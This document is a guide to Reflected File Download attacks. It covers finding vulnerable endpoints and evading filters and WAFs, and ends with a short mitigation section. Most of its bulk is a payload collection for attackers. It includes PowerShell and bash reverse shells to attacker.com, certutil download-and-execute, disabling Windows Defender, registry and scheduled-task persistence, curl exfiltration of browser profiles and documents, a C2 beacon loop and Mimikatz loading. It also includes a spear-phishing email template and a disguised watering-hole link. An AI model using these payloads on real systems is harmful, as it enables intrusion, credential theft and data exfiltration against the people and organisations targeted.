## 1. Overview

Reflected File Download (RFD) is a web-based attack vector that extends reflected attacks beyond the context of the web browser. Unlike traditional reflected vulnerabilities that execute within the browser, RFD allows attackers to craft malicious URLs that, when accessed, cause the browser to download files with attacker-controlled content and extensions.

### Key Characteristics

- **Attack Surface**: Extends beyond browser execution to file system level
- **Payload Delivery**: Malicious content is reflected into a downloadable file
- **User Interaction**: Requires the victim to download and execute the file
- **Bypass Capability**: Can bypass traditional XSS filters since content is escaped properly but gains new meaning as a file

### How It Works

Attackers exploit endpoints that:

1. Reflect user input in responses (e.g., JSONP callbacks, API responses)
2. Allow control over the downloaded filename
3. Serve content with exploitable file extensions (`.bat`, `.cmd`, `.sh`, etc.)

Even when input is properly escaped for web context, the same content becomes executable when interpreted as a batch file, shell script, or other executable format.

## 2. Exploitation Methods

### Detection Steps

#### Step 1: Identify Reflected Input Points

Look for endpoints that reflect user-controlled input:

- JSONP callback parameters
- API response formatting parameters
- Export/download functionality
- Debug or error endpoints

**Example vulnerable patterns:**

```
https://example.com/api?callback=USER_INPUT
https://example.com/export?format=json&data=USER_INPUT
https://example.com/download?filename=USER_INPUT
```

#### Step 2: Check Content-Disposition Header

Verify if the response includes a `Content-Disposition` header and whether it specifies a filename:

**Vulnerable (no filename specified):**

```http
Content-Disposition: attachment;
```

**Not vulnerable (filename is set):**

```http
Content-Disposition: attachment; filename="data.json"
```

If no `Content-Disposition` header exists, you can force a download using HTML5's `download` attribute.

#### Step 3: Test Filename Control

Try manipulating the URL path to control the downloaded filename:

```
https://example.com/api;/evil.bat;?callback=payload
https://example.com/api/../../evil.cmd?callback=payload
https://example.com/api;evil.sh?callback=payload
```

### Basic Exploitation

#### Windows Batch File Exploitation

**Payload structure:**

```
http://example.com/api;/evil.bat;?callback=||calc||
```

**How it works:**

- The semicolon (`;`) in the URL path tricks the browser into treating everything after it as the filename
- `evil.bat` becomes the downloaded filename
- `||calc||` is reflected in the response and executed when the batch file runs
- In batch files, `||` means "execute if previous command fails"

**Full example:**

```html
<a download href="https://example.com/api;/malicious.bat;?callback=||calc||">Download Report</a>
```

#### Command Chaining in Batch Files

Batch files support multiple command separators:

- `||` - Execute if previous command fails
- `&&` - Execute if previous command succeeds
- `&` - Execute regardless
- `|` - Pipe output

**Example payloads:**

```
callback=||powershell -c "IEX(New-Object Net.WebClient).downloadString('http://evil.com/payload')"||
callback=&certutil -urlcache -split -f http://evil.com/malware.exe %temp%\malware.exe&
callback=||start http://phishing-site.com||
```

### Advanced Exploitation Techniques

#### Using HTML5 Download Attribute

When the server doesn't set a filename, force download with HTML:

```html
<a download="payload.bat" href="https://example.com/api?callback=||calc||">
    Click to Download
</a>
```

#### JSONP Callback Exploitation

JSONP endpoints are prime targets:

**Vulnerable endpoint:**

```javascript
https://example.com/api?callback=processData

Response:
processData({"user":"admin","role":"user"})
```

**Exploit:**

```
https://example.com/api;/evil.bat;?callback=||notepad||rem
```

The `rem` command comments out the rest of the JSON, preventing syntax errors.

#### Multi-Extension Attacks

Stack extensions to bypass filters:

```
https://example.com/api;/file.txt.bat;?callback=||calc||
https://example.com/api;/document.pdf.cmd;?callback=||calc||
```

## 3. Bypasses

### Filter Evasion Techniques

#### Encoding Bypasses

**URL encoding:**

```
callback=%7C%7Ccalc%7C%7C  (||calc||)
callback=%26%26calc%26%26  (&&calc&&)
```

**Double encoding:**

```
callback=%257C%257Ccalc%257C%257C
```

#### Case Variation

Some filters are case-sensitive:

```
.BAT instead of .bat
.Cmd instead of .cmd
.BaT mixed case
```

#### Extension Alternatives

If `.bat` is blocked, try:

- `.cmd` - Windows command script
- `.com` - DOS executable
- `.exe` - If you can upload/inject binary content
- `.vbs` - VBScript
- `.ps1` - PowerShell (requires different syntax)
- `.sh` - Shell script (Linux/Mac)

#### Path Traversal Combinations

```
/api;/../../evil.bat;
/api;/.;/evil.bat;
/api;/./././evil.bat;
```

### WAF Bypasses

**Space alternatives:**

```
callback=||calc||
callback=||%09calc||  (tab)
callback=||$IFS$9calc||  (Linux)
```

**Command obfuscation:**

```
callback=||c^alc||  (Windows caret escape)
callback=||c"a"lc||  (quote insertion)
callback=||ca""lc||  (empty quotes)
```

## 4. Payloads

### Windows Payloads

#### 1. Calculator Pop (Proof of Concept)

```
||calc||
```

#### 2. PowerShell Reverse Shell

```
||powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"||
```

#### 3. Download and Execute Malware

```
||certutil -urlcache -split -f http://attacker.com/malware.exe %temp%\m.exe && %temp%\m.exe||
```

#### 4. Credential Harvesting

```
||powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker.com/keylogger.ps1')"||
```

#### 5. Add Persistent Backdoor

```
||reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "powershell -w hidden -c IEX(New-Object Net.WebClient).downloadString('http://attacker.com/payload')" /f||
```

#### 6. Exfiltrate Browser Data

```
||powershell -c "Compress-Archive -Path $env:APPDATA\Mozilla\Firefox\Profiles\ -DestinationPath $env:temp\d.zip; curl -F 'file=@%temp%\d.zip' http://attacker.com/upload"||
```

#### 7. Network Reconnaissance

```
||for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "Reply" >> %temp%\scan.txt && curl -F "data=@%temp%\scan.txt" http://attacker.com/data||
```

#### 8. Steal Credentials via Phishing

```
||mshta "javascript:document.write('<iframe src=http://attacker.com/phish></iframe>');close()"||
```

#### 9. Disable Security Software

```
||powershell -c "Stop-Service -Name WinDefend -Force; Set-MpPreference -DisableRealtimeMonitoring $true"||
```

#### 10. Create Scheduled Task for Persistence

```
||schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -c IEX(New-Object Net.WebClient).downloadString('http://attacker.com/update')" /sc onlogon /ru System /f||
```

### Linux/Mac Payloads

#### Basic Shell Command

```
;cat /etc/passwd > /tmp/out.txt;
```

#### Reverse Shell

```
;bash -i >& /dev/tcp/attacker.com/4444 0>&1;
```

## 5. Higher Impact Scenarios

### Enterprise Exploitation

#### Domain Privilege Escalation

When targeting enterprise environments, RFD can be chained with other attacks:

```
||powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker.com/mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"||
```

**Impact:** Extract credentials from memory, potentially gaining domain admin access.

#### Ransomware Deployment

```
||powershell -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://attacker.com/encrypt.ps1')"||
```

**Impact:** File encryption across network shares, data exfiltration, ransom demands.

#### Supply Chain Attacks

Targeting developer or admin accounts:

```
||powershell -c "git config --global core.sshCommand 'ssh -o ProxyCommand=\"curl http://attacker.com/data?key=%p\"'"||
```

**Impact:** Compromise source code repositories, inject backdoors into software updates.

### Social Engineering Amplification

#### Watering Hole Attacks

Place RFD links on legitimate-looking internal portals or forums:

```html
<a download="Q4_Financial_Report.bat" href="https://trusted-internal-api.company.com/export;/Q4_Financial_Report.bat;?callback=||powershell hidden payload||">
    Download Q4 Financial Report (Excel)
</a>
```

**Impact:** Higher success rate due to trusted domain and convincing filename.

#### Spear Phishing Campaigns

Combine with email spoofing:

```
Subject: Urgent: Security Update Required

Dear Employee,

Please download and run the attached security patch immediately:
https://company-sso.com/api;/Security_Patch_2024.bat;?callback=||malicious_payload||

IT Security Team
```

**Impact:** Targets specific high-value individuals, bypasses email security due to legitimate domain.

### Data Exfiltration at Scale

#### Automated Collection

```
||powershell -c "Get-ChildItem -Path C:\Users -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -Recurse | ForEach-Object {Compress-Archive -Path $_.FullName -DestinationPath $env:temp\$($_.Name).zip -Update}; Get-ChildItem $env:temp\*.zip | ForEach-Object {curl -F 'file=@$($_.FullName)' http://attacker.com/upload}"||
```

**Impact:** Mass exfiltration of sensitive documents across entire systems.

#### Persistent Access with C2

```
||powershell -w hidden -nop -c "while($true){try{$c=New-Object Net.WebClient;$cmd=$c.downloadstring('http://attacker.com/cmd');$res=iex $cmd 2>&1|Out-String;$c.uploadstring('http://attacker.com/res',$res)}catch{};sleep 60}"||
```

**Impact:** Long-term command and control, allowing ongoing espionage.

## 6. Mitigations

### Server-Side Protections

#### Always Set Explicit Filenames

**Secure implementation:**

```http
Content-Disposition: attachment; filename="data.json"
Content-Type: application/json
```

Never allow user input to influence the filename in `Content-Disposition` headers.

#### Use Content-Type Correctly

Set appropriate MIME types to prevent misinterpretation:

```http
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
```

#### Input Validation and Sanitization

- Reject or sanitize special characters in reflected parameters
- Whitelist allowed characters for callback parameters
- Implement strict regex patterns: `^[a-zA-Z0-9_]+$`

**Example validation:**

```python
import re

def validate_callback(callback):
    if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', callback):
        return "defaultCallback"
    return callback
```

#### Remove JSONP Support

Replace JSONP with CORS for cross-origin requests:

```http
Access-Control-Allow-Origin: https://trusted-domain.com
Access-Control-Allow-Credentials: true
```

### Client-Side Protections

#### Browser Security Headers

Implement CSP to limit script execution:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

#### File Download Warnings

Educate users about:

- Never executing downloaded files from unexpected sources
- Checking file extensions before opening
- Being suspicious of `.bat`, `.cmd`, `.vbs`, `.ps1` files

### Network-Level Protections

#### Web Application Firewall (WAF)

Configure WAF rules to detect RFD patterns:

- Block URLs with semicolons followed by executable extensions
- Monitor for command injection patterns in query parameters
- Alert on suspicious callback parameter values

**Example ModSecurity rule:**

```
SecRule REQUEST_URI "@rx ;.*\.(bat|cmd|vbs|ps1|sh|exe)" \
    "id:1001,phase:1,deny,status:403,msg:'Potential RFD attack detected'"
```

#### Endpoint Protection

Deploy endpoint detection and response (EDR) solutions:

- Monitor for execution of files from download directories
- Block execution of scripts downloaded from web browsers
- Implement application whitelisting

### Development Best Practices

#### Secure API Design

1. **Avoid reflection of user input in downloadable responses**
2. **Use POST instead of GET for API endpoints that return data**
3. **Implement request signing/authentication**
4. **Rate limit API endpoints to prevent automated attacks**

#### Code Review Checklist

- [ ] All download endpoints set explicit filenames
- [ ] No user input reflected in response without sanitization
- [ ] JSONP endpoints deprecated or properly secured
- [ ] Content-Type headers correctly set
- [ ] Input validation implemented for all parameters
- [ ] Security headers configured

#### Testing and Monitoring

- Include RFD in penetration testing scope
- Monitor for unusual download patterns
- Log all file download requests with user context
- Implement anomaly detection for suspicious API usage

**Monitoring query example:**

```sql
SELECT user_id, url, timestamp 
FROM download_logs 
WHERE url LIKE '%;/%'
   OR url LIKE '%.bat%'
   OR url LIKE '%.cmd%'
GROUP BY user_id 
HAVING COUNT(*) > 10;
```